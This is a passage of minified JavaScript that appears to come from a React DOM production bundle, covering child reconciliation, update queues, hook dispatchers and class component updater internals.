            if (ra(d) || Gn(d))
                return d = Xt(d, f.mode, g, null),
                d.return = f,
                d;
            tr(f, d)
        }
        return null
    }
    function x(f, d, g, S) {
        var w = d !== null ? d.key : null;
        if (typeof g == "string" && g !== "" || typeof g == "number")
            return w !== null ? null : l(f, d, "" + g, S);
        if (typeof g == "object" && g !== null) {
            switch (g.$$typeof) {
            case _a:
                return g.key === w ? u(f, d, g, S) : null;
            case fn:
                return g.key === w ? c(f, d, g, S) : null;
            case jt:
                return w = g._init,
                x(f, d, w(g._payload), S)
            }
            if (ra(g) || Gn(g))
                return w !== null ? null : m(f, d, g, S, null);
            tr(f, g)
        }
        return null
    }
    function y(f, d, g, S, w) {
        if (typeof S == "string" && S !== "" || typeof S == "number")
            return f = f.get(g) || null,
            l(d, f, "" + S, w);
        if (typeof S == "object" && S !== null) {
            switch (S.$$typeof) {
            case _a:
                return f = f.get(S.key === null ? g : S.key) || null,
                u(d, f, S, w);
            case fn:
                return f = f.get(S.key === null ? g : S.key) || null,
                c(d, f, S, w);
            case jt:
                var j = S._init;
                return y(f, d, g, j(S._payload), w)
            }
            if (ra(S) || Gn(S))
                return f = f.get(g) || null,
                m(d, f, S, w, null);
            tr(d, S)
        }
        return null
    }
    function v(f, d, g, S) {
        for (var w = null, j = null, B = d, b = d = 0, N = null; B !== null && b < g.length; b++) {
            B.index > b ? (N = B,
            B = null) : N = B.sibling;
            var P = x(f, B, g[b], S);
            if (P === null) {
                B === null && (B = N);
                break
            }
            e && B && P.alternate === null && t(f, B),
            d = i(P, d, b),
            j === null ? w = P : j.sibling = P,
            j = P,
            B = N
        }
        if (b === g.length)
            return n(f, B),
            te && Ht(f, b),
            w;
        if (B === null) {
            for (; b < g.length; b++)
                B = h(f, g[b], S),
                B !== null && (d = i(B, d, b),
                j === null ? w = B : j.sibling = B,
                j = B);
            return te && Ht(f, b),
            w
        }
        for (B = r(f, B); b < g.length; b++)
            N = y(B, f, b, g[b], S),
            N !== null && (e && N.alternate !== null && B.delete(N.key === null ? b : N.key),
            d = i(N, d, b),
            j === null ? w = N : j.sibling = N,
            j = N);
        return e && B.forEach(function(M) {
            return t(f, M)
        }),
        te && Ht(f, b),
        w
    }
    function k(f, d, g, S) {
        var w = Gn(g);
        if (typeof w != "function")
            throw Error(C(150));
        if (g = w.call(g),
        g == null)
            throw Error(C(151));
        for (var j = w = null, B = d, b = d = 0, N = null, P = g.next(); B !== null && !P.done; b++,
        P = g.next()) {
            B.index > b ? (N = B,
            B = null) : N = B.sibling;
            var M = x(f, B, P.value, S);
            if (M === null) {
                B === null && (B = N);
                break
            }
            e && B && M.alternate === null && t(f, B),
            d = i(M, d, b),
            j === null ? w = M : j.sibling = M,
            j = M,
            B = N
        }
        if (P.done)
            return n(f, B),
            te && Ht(f, b),
            w;
        if (B === null) {
            for (; !P.done; b++,
            P = g.next())
                P = h(f, P.value, S),
                P !== null && (d = i(P, d, b),
                j === null ? w = P : j.sibling = P,
                j = P);
            return te && Ht(f, b),
            w
        }
        for (B = r(f, B); !P.done; b++,
        P = g.next())
            P = y(B, f, b, P.value, S),
            P !== null && (e && P.alternate !== null && B.delete(P.key === null ? b : P.key),
            d = i(P, d, b),
            j === null ? w = P : j.sibling = P,
            j = P);
        return e && B.forEach(function(U) {
            return t(f, U)
        }),
        te && Ht(f, b),
        w
    }
    function p(f, d, g, S) {
        if (typeof g == "object" && g !== null && g.type === xn && g.key === null && (g = g.props.children),
        typeof g == "object" && g !== null) {
            switch (g.$$typeof) {
            case _a:
                e: {
                    for (var w = g.key, j = d; j !== null; ) {
                        if (j.key === w) {
                            if (w = g.type,
                            w === xn) {
                                if (j.tag === 7) {
                                    n(f, j.sibling),
                                    d = s(j, g.props.children),
                                    d.return = f,
                                    f = d;
                                    break e
                                }
                            } else if (j.elementType === w || typeof w == "object" && w !== null && w.$$typeof === jt && Kl(w) === j.type) {
                                n(f, j.sibling),
                                d = s(j, g.props),
                                d.ref = Zn(f, j, g),
                                d.return = f,
                                f = d;
                                break e
                            }
                            n(f, j);
                            break
                        } else
                            t(f, j);
                        j = j.sibling
                    }
                    g.type === xn ? (d = Xt(g.props.children, f.mode, S, g.key),
                    d.return = f,
                    f = d) : (S = Sr(g.type, g.key, g.props, null, f.mode, S),
                    S.ref = Zn(f, d, g),
                    S.return = f,
                    f = S)
                }
                return o(f);
            case fn:
                e: {
                    for (j = g.key; d !== null; ) {
                        if (d.key === j)
                            if (d.tag === 4 && d.stateNode.containerInfo === g.containerInfo && d.stateNode.implementation === g.implementation) {
                                n(f, d.sibling),
                                d = s(d, g.children || []),
                                d.return = f,
                                f = d;
                                break e
                            } else {
                                n(f, d);
                                break
                            }
                        else
                            t(f, d);
                        d = d.sibling
                    }
                    d = Vs(g, f.mode, S),
                    d.return = f,
                    f = d
                }
                return o(f);
            case jt:
                return j = g._init,
                p(f, d, j(g._payload), S)
            }
            if (ra(g))
                return v(f, d, g, S);
            if (Gn(g))
                return k(f, d, g, S);
            tr(f, g)
        }
        return typeof g == "string" && g !== "" || typeof g == "number" ? (g = "" + g,
        d !== null && d.tag === 6 ? (n(f, d.sibling),
        d = s(d, g),
        d.return = f,
        f = d) : (n(f, d),
        d = _s(g, f.mode, S),
        d.return = f,
        f = d),
        o(f)) : n(f, d)
    }
    return p
}
var zn = id(!0)
  , od = id(!1)
  , Mr = Kt(null)
  , Ur = null
  , kn = null
  , wo = null;
function bo() {
    wo = kn = Ur = null
}
function No(e) {
    var t = Mr.current;
    ee(Mr),
    e._currentValue = t
}
function Bi(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t,
        r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
        e === n)
            break;
        e = e.return
    }
}
function An(e, t) {
    Ur = e,
    wo = kn = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (Ce = !0),
    e.firstContext = null)
}
function Ge(e) {
    var t = e._currentValue;
    if (wo !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        },
        kn === null) {
            if (Ur === null)
                throw Error(C(308));
            kn = e,
            Ur.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else
            kn = kn.next = e;
    return t
}
var Yt = null;
function ko(e) {
    Yt === null ? Yt = [e] : Yt.push(e)
}
function ld(e, t, n, r) {
    var s = t.interleaved;
    return s === null ? (n.next = n,
    ko(t)) : (n.next = s.next,
    s.next = n),
    t.interleaved = n,
    St(e, r)
}
function St(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null; )
        e.childLanes |= t,
        n = e.alternate,
        n !== null && (n.childLanes |= t),
        n = e,
        e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var Bt = !1;
function jo(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}
function cd(e, t) {
    e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}
function gt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}
function Rt(e, t, n) {
    var r = e.updateQueue;
    if (r === null)
        return null;
    if (r = r.shared,
    q & 2) {
        var s = r.pending;
        return s === null ? t.next = t : (t.next = s.next,
        s.next = t),
        r.pending = t,
        St(e, n)
    }
    return s = r.interleaved,
    s === null ? (t.next = t,
    ko(r)) : (t.next = s.next,
    s.next = t),
    r.interleaved = t,
    St(e, n)
}
function pr(e, t, n) {
    if (t = t.updateQueue,
    t !== null && (t = t.shared,
    (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        co(e, n)
    }
}
function _l(e, t) {
    var n = e.updateQueue
      , r = e.alternate;
    if (r !== null && (r = r.updateQueue,
    n === r)) {
        var s = null
          , i = null;
        if (n = n.firstBaseUpdate,
        n !== null) {
            do {
                var o = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                i === null ? s = i = o : i = i.next = o,
                n = n.next
            } while (n !== null);
            i === null ? s = i = t : i = i.next = t
        } else
            s = i = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: s,
            lastBaseUpdate: i,
            shared: r.shared,
            effects: r.effects
        },
        e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function zr(e, t, n, r) {
    var s = e.updateQueue;
    Bt = !1;
    var i = s.firstBaseUpdate
      , o = s.lastBaseUpdate
      , l = s.shared.pending;
    if (l !== null) {
        s.shared.pending = null;
        var u = l
          , c = u.next;
        u.next = null,
        o === null ? i = c : o.next = c,
        o = u;
        var m = e.alternate;
        m !== null && (m = m.updateQueue,
        l = m.lastBaseUpdate,
        l !== o && (l === null ? m.firstBaseUpdate = c : l.next = c,
        m.lastBaseUpdate = u))
    }
    if (i !== null) {
        var h = s.baseState;
        o = 0,
        m = c = u = null,
        l = i;
        do {
            var x = l.lane
              , y = l.eventTime;
            if ((r & x) === x) {
                m !== null && (m = m.next = {
                    eventTime: y,
                    lane: 0,
                    tag: l.tag,
                    payload: l.payload,
                    callback: l.callback,
                    next: null
                });
                e: {
                    var v = e
                      , k = l;
                    switch (x = t,
                    y = n,
                    k.tag) {
                    case 1:
                        if (v = k.payload,
                        typeof v == "function") {
                            h = v.call(y, h, x);
                            break e
                        }
                        h = v;
                        break e;
                    case 3:
                        v.flags = v.flags & -65537 | 128;
                    case 0:
                        if (v = k.payload,
                        x = typeof v == "function" ? v.call(y, h, x) : v,
                        x == null)
                            break e;
                        h = re({}, h, x);
                        break e;
                    case 2:
                        Bt = !0
                    }
                }
                l.callback !== null && l.lane !== 0 && (e.flags |= 64,
                x = s.effects,
                x === null ? s.effects = [l] : x.push(l))
            } else
                y = {
                    eventTime: y,
                    lane: x,
                    tag: l.tag,
                    payload: l.payload,
                    callback: l.callback,
                    next: null
                },
                m === null ? (c = m = y,
                u = h) : m = m.next = y,
                o |= x;
            if (l = l.next,
            l === null) {
                if (l = s.shared.pending,
                l === null)
                    break;
                x = l,
                l = x.next,
                x.next = null,
                s.lastBaseUpdate = x,
                s.shared.pending = null
            }
        } while (!0);
        if (m === null && (u = h),
        s.baseState = u,
        s.firstBaseUpdate = c,
        s.lastBaseUpdate = m,
        t = s.shared.interleaved,
        t !== null) {
            s = t;
            do
                o |= s.lane,
                s = s.next;
            while (s !== t)
        } else
            i === null && (s.shared.lanes = 0);
        rn |= o,
        e.lanes = o,
        e.memoizedState = h
    }
}
function Vl(e, t, n) {
    if (e = t.effects,
    t.effects = null,
    e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t]
              , s = r.callback;
            if (s !== null) {
                if (r.callback = null,
                r = n,
                typeof s != "function")
                    throw Error(C(191, s));
                s.call(r)
            }
        }
}
var Fa = {}
  , ut = Kt(Fa)
  , Pa = Kt(Fa)
  , $a = Kt(Fa);
function Jt(e) {
    if (e === Fa)
        throw Error(C(174));
    return e
}
function Bo(e, t) {
    switch (Z($a, t),
    Z(Pa, e),
    Z(ut, Fa),
    e = t.nodeType,
    e) {
    case 9:
    case 11:
        t = (t = t.documentElement) ? t.namespaceURI : ii(null, "");
        break;
    default:
        e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = ii(t, e)
    }
    ee(ut),
    Z(ut, t)
}
function Wn() {
    ee(ut),
    ee(Pa),
    ee($a)
}
function ud(e) {
    Jt($a.current);
    var t = Jt(ut.current)
      , n = ii(t, e.type);
    t !== n && (Z(Pa, e),
    Z(ut, n))
}
function To(e) {
    Pa.current === e && (ee(ut),
    ee(Pa))
}
var ne = Kt(0);
function Wr(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated,
            n === null || n.data === "$?" || n.data === "$!"))
                return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128)
                return t
        } else if (t.child !== null) {
            t.child.return = t,
            t = t.child;
            continue
        }
        if (t === e)
            break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e)
                return null;
            t = t.return
        }
        t.sibling.return = t.return,
        t = t.sibling
    }
    return null
}
var zs = [];
function Co() {
    for (var e = 0; e < zs.length; e++)
        zs[e]._workInProgressVersionPrimary = null;
    zs.length = 0
}
var fr = bt.ReactCurrentDispatcher
  , Ws = bt.ReactCurrentBatchConfig
  , an = 0
  , ae = null
  , ce = null
  , de = null
  , Lr = !1
  , ma = !1
  , Ea = 0
  , bp = 0;
function ye() {
    throw Error(C(321))
}
function Po(e, t) {
    if (t === null)
        return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!nt(e[n], t[n]))
            return !1;
    return !0
}
function $o(e, t, n, r, s, i) {
    if (an = i,
    ae = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    fr.current = e === null || e.memoizedState === null ? Bp : Tp,
    e = n(r, s),
    ma) {
        i = 0;
        do {
            if (ma = !1,
            Ea = 0,
            25 <= i)
                throw Error(C(301));
            i += 1,
            de = ce = null,
            t.updateQueue = null,
            fr.current = Cp,
            e = n(r, s)
        } while (ma)
    }
    if (fr.current = Or,
    t = ce !== null && ce.next !== null,
    an = 0,
    de = ce = ae = null,
    Lr = !1,
    t)
        throw Error(C(300));
    return e
}
function Eo() {
    var e = Ea !== 0;
    return Ea = 0,
    e
}
function it() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return de === null ? ae.memoizedState = de = e : de = de.next = e,
    de
}
function qe() {
    if (ce === null) {
        var e = ae.alternate;
        e = e !== null ? e.memoizedState : null
    } else
        e = ce.next;
    var t = de === null ? ae.memoizedState : de.next;
    if (t !== null)
        de = t,
        ce = e;
    else {
        if (e === null)
            throw Error(C(310));
        ce = e,
        e = {
            memoizedState: ce.memoizedState,
            baseState: ce.baseState,
            baseQueue: ce.baseQueue,
            queue: ce.queue,
            next: null
        },
        de === null ? ae.memoizedState = de = e : de = de.next = e
    }
    return de
}
function Aa(e, t) {
    return typeof t == "function" ? t(e) : t
}
function Ls(e) {
    var t = qe()
      , n = t.queue;
    if (n === null)
        throw Error(C(311));
    n.lastRenderedReducer = e;
    var r = ce
      , s = r.baseQueue
      , i = n.pending;
    if (i !== null) {
        if (s !== null) {
            var o = s.next;
            s.next = i.next,
            i.next = o
        }
        r.baseQueue = s = i,
        n.pending = null
    }
    if (s !== null) {
        i = s.next,
        r = r.baseState;
        var l = o = null
          , u = null
          , c = i;
        do {
            var m = c.lane;
            if ((an & m) === m)
                u !== null && (u = u.next = {
                    lane: 0,
                    action: c.action,
                    hasEagerState: c.hasEagerState,
                    eagerState: c.eagerState,
                    next: null
                }),
                r = c.hasEagerState ? c.eagerState : e(r, c.action);
            else {
                var h = {
                    lane: m,
                    action: c.action,
                    hasEagerState: c.hasEagerState,
                    eagerState: c.eagerState,
                    next: null
                };
                u === null ? (l = u = h,
                o = r) : u = u.next = h,
                ae.lanes |= m,
                rn |= m
            }
            c = c.next
        } while (c !== null && c !== i);
        u === null ? o = r : u.next = l,
        nt(r, t.memoizedState) || (Ce = !0),
        t.memoizedState = r,
        t.baseState = o,
        t.baseQueue = u,
        n.lastRenderedState = r
    }
    if (e = n.interleaved,
    e !== null) {
        s = e;
        do
            i = s.lane,
            ae.lanes |= i,
            rn |= i,
            s = s.next;
        while (s !== e)
    } else
        s === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}
function Os(e) {
    var t = qe()
      , n = t.queue;
    if (n === null)
        throw Error(C(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch
      , s = n.pending
      , i = t.memoizedState;
    if (s !== null) {
        n.pending = null;
        var o = s = s.next;
        do
            i = e(i, o.action),
            o = o.next;
        while (o !== s);
        nt(i, t.memoizedState) || (Ce = !0),
        t.memoizedState = i,
        t.baseQueue === null && (t.baseState = i),
        n.lastRenderedState = i
    }
    return [i, r]
}
function dd() {}
function md(e, t) {
    var n = ae
      , r = qe()
      , s = t()
      , i = !nt(r.memoizedState, s);
    if (i && (r.memoizedState = s,
    Ce = !0),
    r = r.queue,
    Ao(fd.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || i || de !== null && de.memoizedState.tag & 1) {
        if (n.flags |= 2048,
        Ia(9, pd.bind(null, n, r, s, t), void 0, null),
        me === null)
            throw Error(C(349));
        an & 30 || hd(n, t, s)
    }
    return s
}
function hd(e, t, n) {
    e.flags |= 16384,
    e = {
        getSnapshot: t,
        value: n
    },
    t = ae.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    ae.updateQueue = t,
    t.stores = [e]) : (n = t.stores,
    n === null ? t.stores = [e] : n.push(e))
}
function pd(e, t, n, r) {
    t.value = n,
    t.getSnapshot = r,
    xd(t) && gd(e)
}
function fd(e, t, n) {
    return n(function() {
        xd(t) && gd(e)
    })
}
function xd(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !nt(e, n)
    } catch {
        return !0
    }
}
function gd(e) {
    var t = St(e, 1);
    t !== null && et(t, e, 1, -1)
}
function Hl(e) {
    var t = it();
    return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Aa,
        lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = jp.bind(null, ae, e),
    [t.memoizedState, e]
}
function Ia(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    },
    t = ae.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    ae.updateQueue = t,
    t.lastEffect = e.next = e) : (n = t.lastEffect,
    n === null ? t.lastEffect = e.next = e : (r = n.next,
    n.next = e,
    e.next = r,
    t.lastEffect = e)),
    e
}
function yd() {
    return qe().memoizedState
}
function xr(e, t, n, r) {
    var s = it();
    ae.flags |= e,
    s.memoizedState = Ia(1 | t, n, void 0, r === void 0 ? null : r)
}
function ss(e, t, n, r) {
    var s = qe();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (ce !== null) {
        var o = ce.memoizedState;
        if (i = o.destroy,
        r !== null && Po(r, o.deps)) {
            s.memoizedState = Ia(t, n, i, r);
            return
        }
    }
    ae.flags |= e,
    s.memoizedState = Ia(1 | t, n, i, r)
}
function Gl(e, t) {
    return xr(8390656, 8, e, t)
}
function Ao(e, t) {
    return ss(2048, 8, e, t)
}
function vd(e, t) {
    return ss(4, 2, e, t)
}
function Sd(e, t) {
    return ss(4, 4, e, t)
}
function wd(e, t) {
    if (typeof t == "function")
        return e = e(),
        t(e),
        function() {
            t(null)
        }
        ;
    if (t != null)
        return e = e(),
        t.current = e,
        function() {
            t.current = null
        }
}
function bd(e, t, n) {
    return n = n != null ? n.concat([e]) : null,
    ss(4, 4, wd.bind(null, t, e), n)
}
function Io() {}
function Nd(e, t) {
    var n = qe();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Po(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function kd(e, t) {
    var n = qe();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Po(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function jd(e, t, n) {
    return an & 21 ? (nt(n, t) || (n = $u(),
    ae.lanes |= n,
    rn |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
    Ce = !0),
    e.memoizedState = n)
}
function Np(e, t) {
    var n = Y;
    Y = n !== 0 && 4 > n ? n : 4,
    e(!0);
    var r = Ws.transition;
    Ws.transition = {};
    try {
        e(!1),
        t()
    } finally {
        Y = n,
        Ws.transition = r
    }
}
function Bd() {
    return qe().memoizedState
}
function kp(e, t, n) {
    var r = Ut(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    },
    Td(e))
        Cd(t, n);
    else if (n = ld(e, t, n, r),
    n !== null) {
        var s = ke();
        et(n, e, r, s),
        Pd(n, t, r)
    }
}
function jp(e, t, n) {
    var r = Ut(e)
      , s = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    };
    if (Td(e))
        Cd(t, s);
    else {
        var i = e.alternate;
        if (e.lanes === 0 && (i === null || i.lanes === 0) && (i = t.lastRenderedReducer,
        i !== null))
            try {
                var o = t.lastRenderedState
                  , l = i(o, n);
                if (s.hasEagerState = !0,
                s.eagerState = l,
                nt(l, o)) {
                    var u = t.interleaved;
                    u === null ? (s.next = s,
                    ko(t)) : (s.next = u.next,
                    u.next = s),
                    t.interleaved = s;
                    return
                }
            } catch {} finally {}
        n = ld(e, t, s, r),
        n !== null && (s = ke(),
        et(n, e, r, s),
        Pd(n, t, r))
    }
}
function Td(e) {
    var t = e.alternate;
    return e === ae || t !== null && t === ae
}
function Cd(e, t) {
    ma = Lr = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function Pd(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        co(e, n)
    }
}
var Or = {
    readContext: Ge,
    useCallback: ye,
    useContext: ye,
    useEffect: ye,
    useImperativeHandle: ye,
    useInsertionEffect: ye,
    useLayoutEffect: ye,
    useMemo: ye,
    useReducer: ye,
    useRef: ye,
    useState: ye,
    useDebugValue: ye,
    useDeferredValue: ye,
    useTransition: ye,
    useMutableSource: ye,
    useSyncExternalStore: ye,
    useId: ye,
    unstable_isNewReconciler: !1
}
  , Bp = {
    readContext: Ge,
    useCallback: function(e, t) {
        return it().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: Ge,
    useEffect: Gl,
    useImperativeHandle: function(e, t, n) {
        return n = n != null ? n.concat([e]) : null,
        xr(4194308, 4, wd.bind(null, t, e), n)
    },
    useLayoutEffect: function(e, t) {
        return xr(4194308, 4, e, t)
    },
    useInsertionEffect: function(e, t) {
        return xr(4, 2, e, t)
    },
    useMemo: function(e, t) {
        var n = it();
        return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function(e, t, n) {
        var r = it();
        return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = kp.bind(null, ae, e),
        [r.memoizedState, e]
    },
    useRef: function(e) {
        var t = it();
        return e = {
            current: e
        },
        t.memoizedState = e
    },
    useState: Hl,
    useDebugValue: Io,
    useDeferredValue: function(e) {
        return it().memoizedState = e
    },
    useTransition: function() {
        var e = Hl(!1)
          , t = e[0];
        return e = Np.bind(null, e[1]),
        it().memoizedState = e,
        [t, e]
    },
    useMutableSource: function() {},
    useSyncExternalStore: function(e, t, n) {
        var r = ae
          , s = it();
        if (te) {
            if (n === void 0)
                throw Error(C(407));
            n = n()
        } else {
            if (n = t(),
            me === null)
                throw Error(C(349));
            an & 30 || hd(r, t, n)
        }
        s.memoizedState = n;
        var i = {
            value: n,
            getSnapshot: t
        };
        return s.queue = i,
        Gl(fd.bind(null, r, i, e), [e]),
        r.flags |= 2048,
        Ia(9, pd.bind(null, r, i, n, t), void 0, null),
        n
    },
    useId: function() {
        var e = it()
          , t = me.identifierPrefix;
        if (te) {
            var n = xt
              , r = ft;
            n = (r & ~(1 << 32 - Xe(r) - 1)).toString(32) + n,
            t = ":" + t + "R" + n,
            n = Ea++,
            0 < n && (t += "H" + n.toString(32)),
            t += ":"
        } else
            n = bp++,
            t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
}
  , Tp = {
    readContext: Ge,
    useCallback: Nd,
    useContext: Ge,
    useEffect: Ao,
    useImperativeHandle: bd,
    useInsertionEffect: vd,
    useLayoutEffect: Sd,
    useMemo: kd,
    useReducer: Ls,
    useRef: yd,
    useState: function() {
        return Ls(Aa)
    },
    useDebugValue: Io,
    useDeferredValue: function(e) {
        var t = qe();
        return jd(t, ce.memoizedState, e)
    },
    useTransition: function() {
        var e = Ls(Aa)[0]
          , t = qe().memoizedState;
        return [e, t]
    },
    useMutableSource: dd,
    useSyncExternalStore: md,
    useId: Bd,
    unstable_isNewReconciler: !1
}
  , Cp = {
    readContext: Ge,
    useCallback: Nd,
    useContext: Ge,
    useEffect: Ao,
    useImperativeHandle: bd,
    useInsertionEffect: vd,
    useLayoutEffect: Sd,
    useMemo: kd,
    useReducer: Os,
    useRef: yd,
    useState: function() {
        return Os(Aa)
    },
    useDebugValue: Io,
    useDeferredValue: function(e) {
        var t = qe();
        return ce === null ? t.memoizedState = e : jd(t, ce.memoizedState, e)
    },
    useTransition: function() {
        var e = Os(Aa)[0]
          , t = qe().memoizedState;
        return [e, t]
    },
    useMutableSource: dd,
    useSyncExternalStore: md,
    useId: Bd,
    unstable_isNewReconciler: !1
};
function Je(e, t) {
    if (e && e.defaultProps) {
        t = re({}, t),
        e = e.defaultProps;
        for (var n in e)
            t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
function Ti(e, t, n, r) {
    t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : re({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var is = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? ln(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = ke()
          , s = Ut(e)
          , i = gt(r, s);
        i.payload = t,
        n != null && (i.callback = n),
        t = Rt(e, i, s),
        t !== null && (et(t, e, s, r),
        pr(t, e, s))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = ke()
          , s = Ut(e)
          , i = gt(r, s);
        i.tag = 1,
        i.payload = t,
        n != null && (i.callback = n),
        t = Rt(e, i, s),
        t !== null && (et(t, e, s, r),
        pr(t, e, s))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = ke()
          , r = Ut(e)
          , s = gt(n, r);
        s.tag = 2,
        t != null && (s.callback = t),
        t = Rt(e, s, r),
        t !== null && (et(t, e, r, n),
        pr(t, e, r))
    }
};
function ql(e, t, n, r, s, i, o) {
    return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, i, o) : t.prototype && t.prototype.isPureReactComponent ? !ja(n, r) || !ja(s, i) : !0
}
function $d(e, t, n) {
    var r = !1
      , s = Lt
      , i = t.contextType;
    return typeof i == "object" && i !== null ? i = Ge(i) : (s = $e(t) ? tn : we.current,
    r = t.contextTypes,
    i = (r = r != null) ? Mn(e, s) : Lt),
    t = new t(n,i),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = is,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = s,
    e.__reactInternalMemoizedMaskedChildContext = i),
    t
}
function Yl(e, t, n, r) {
    e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && is.enqueueReplaceState(t, t.state, null)
}
function Ci(e, t, n, r) {
    var s = e.stateNode;
    s.props = n,
    s.state = e.memoizedState,
    s.refs = {},
    jo(e);
    var i = t.contextType;
    typeof i == "object" && i !== null ? s.context = Ge(i) : (i = $e(t) ? tn : we.current,
    s.context = Mn(e, i)),
    s.state = e.memoizedState,
    i = t.getDerivedStateFromProps,
    typeof i == "function" && (Ti(e, t, i, n),
    s.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof s.getSnapshotBeforeUpdate == "function" || typeof s.UNSAFE_componentWillMount != "function" && typeof s.componentWillMount != "function" || (t = s.state,
    typeof s.componentWillMount == "function" && s.componentWillMount(),
    typeof s.UNSAFE_componentWillMount == "function" && s.UNSAFE_componentWillMount(),
    t !== s.state && is.enqueueReplaceState(s, s.state, null),
    zr(e, n, s, r),
    s.state = e.memoizedState),
    typeof s.componentDidMount == "function" && (e.flags |= 4194308)
}
function Ln(e, t) {
    try {
        var n = ""
          , r = t;
        do
            n += nh(r),
            r = r.return;
        while (r);
        var s = n
    } catch (i) {
        s = `
Error generating stack: ` + i.message + `
` + i.stack
    }
    return {
        value: e,
        source: t,
        stack: s,
        digest: null
    }
}
function Fs(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ?? null,
        digest: t ?? null
    }
}
function Pi(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var Pp = typeof WeakMap == "function" ? WeakMap : Map;
function Ed(e, t, n) {
    n = gt(-1, n),
    n.tag = 3,
    n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        Kr || (Kr = !0,
        Wi = r),
        Pi(e, t)
    }
    ,
    n
}
function Ad(e, t, n) {
    n = gt(-1, n),
    n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
